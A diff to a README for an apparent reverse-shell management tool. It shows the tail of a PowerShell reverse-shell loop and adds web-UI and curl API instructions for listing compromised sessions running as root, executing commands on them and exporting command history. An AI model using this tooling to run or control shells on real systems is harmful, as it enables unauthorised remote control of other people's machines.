@@ -149,13 +149,122 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 $client.Close()
 ```
 
-### Managing Reverse Shells
+### Managing Reverse Shells via Web UI
 
 1. **View Connected Shells**: Navigate to "Reverse Shells" in the top menu
 2. **Interactive Shell**: Click "Interact" on a connected shell to execute commands
 3. **Bulk Operations**: Use "Shell Bulk Ops" to run commands on multiple shells
 4. **Export History**: Click "Export CSV" to download execution logs
 5. **Organize**: Group shells by purpose (e.g., "production", "staging", "development")
+
+### Using the API
+
+The application provides RESTful API endpoints for programmatic access to reverse shell management.
+
+#### Authentication
+
+All API requests require authentication. Include your session cookie or use HTTP Basic Auth with your username and password.
+
+#### List All Sessions
+
+```bash
+# Get all reverse shell sessions as JSON
+curl -X GET http://localhost:8000/api/sessions \
+  -u admin:password
+
+# Response:
+{
+  "success": true,
+  "count": 2,
+  "sessions": [
+    {
+      "id": 1,
+      "session_id": "abc123xyz",
+      "name": "web-server-01",
+      "address": "192.168.1.100",
+      "port": 54321,
+      "group_name": "production",
+      "hostname": "web01.example.com",
+      "platform": "Linux",
+      "shell_user": "root",
+      "status": "active",
+      "connected_at": "2024-01-15T10:30:00",
+      "last_seen": "2024-01-15T12:45:30",
+      "disconnected_at": null,
+      "notes": null
+    }
+  ]
+}
+```
+
+#### Execute Command on Session
+
+```bash
+# Execute command on a specific session by session_id
+curl -X POST http://localhost:8000/execute/abc123xyz \
+  -H "Content-Type: application/json" \
+  -u admin:password \
+  -d '{"command": "whoami"}'
+
+# Response:
+{
+  "success": true,
+  "stdout": "root\n",
+  "stderr": "",
+  "exit_code": 0,
+  "execution_time": 0.234,
+  "execution_id": 42
+}
+
+# Error response (session not connected):
+{
+  "success": false,
+  "error": "Session is not currently connected"
+}
+```
+
+#### Export Data
+
+```bash
+# Export sessions to CSV
+curl -X GET http://localhost:8000/export/sessions/csv \
+  -u admin:password \
+  -o sessions.csv
+
+# Export sessions to JSON
+curl -X GET http://localhost:8000/export/sessions/json \
+  -u admin:password \
+  -o sessions.json
+
+# Export sessions to Excel
+curl -X GET http://localhost:8000/export/sessions/xlsx \
+  -u admin:password \
+  -o sessions.xlsx
+
+# Export command history to CSV
+curl -X GET http://localhost:8000/export/commands/csv \
+  -u admin:password \
+  -o commands.csv
+```
+
+### Configuration Options
+
+Set these environment variables to configure the reverse shell listener:
+
+- `REVERSE_SHELL_PORT` - Port for reverse shell listener (default: 5000)
+- `REVERSE_SHELL_BIND_ADDRESS` - Interface to bind to (default: 0.0.0.0)
+- `REVERSE_SHELL_TIMEOUT` - Connection timeout in seconds (default: 30)
+- `MAX_SHELL_SESSIONS` - Maximum concurrent sessions (default: 100)
+- `SHELL_COMMAND_TIMEOUT` - Command execution timeout (default: 30)
+
+Example `.env` configuration:
+```bash
+REVERSE_SHELL_PORT=5000
+REVERSE_SHELL_BIND_ADDRESS=0.0.0.0
+REVERSE_SHELL_TIMEOUT=30
+MAX_SHELL_SESSIONS=100
+SHELL_COMMAND_TIMEOUT=30
+```
 
 ## cPanel deployment notes
 
